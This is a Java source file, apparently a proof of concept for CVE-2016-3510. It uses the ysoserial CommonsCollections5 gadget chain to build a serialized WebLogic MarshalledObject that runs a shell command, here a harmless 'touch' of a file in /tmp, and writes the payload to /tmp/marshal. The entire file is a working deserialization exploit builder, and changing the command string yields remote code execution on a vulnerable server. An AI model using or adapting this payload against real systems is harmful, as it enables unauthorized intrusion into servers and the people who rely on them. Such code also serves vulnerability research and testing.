import weblogic.corba.utils.MarshalledObject;
import ysoserial.payloads.CommonsCollections5;

import javax.management.BadAttributeValueExpException;
import java.io.FileOutputStream;
import java.io.ObjectOutputStream;

public class CVE_2016_3510 {
    public static void main(String[] args) throws Exception{
        CommonsCollections5 commonsCollections5 = new CommonsCollections5();
        BadAttributeValueExpException exp = commonsCollections5.getObject("touch /tmp/alksjdlfkajlskdfj");

        MarshalledObject marshalledObject = new MarshalledObject(exp);

        FileOutputStream fileOutputStream = new FileOutputStream("/tmp/marshal");
        ObjectOutputStream objectOutputStream = new ObjectOutputStream(fileOutputStream);
        objectOutputStream.writeObject(marshalledObject);
    }
}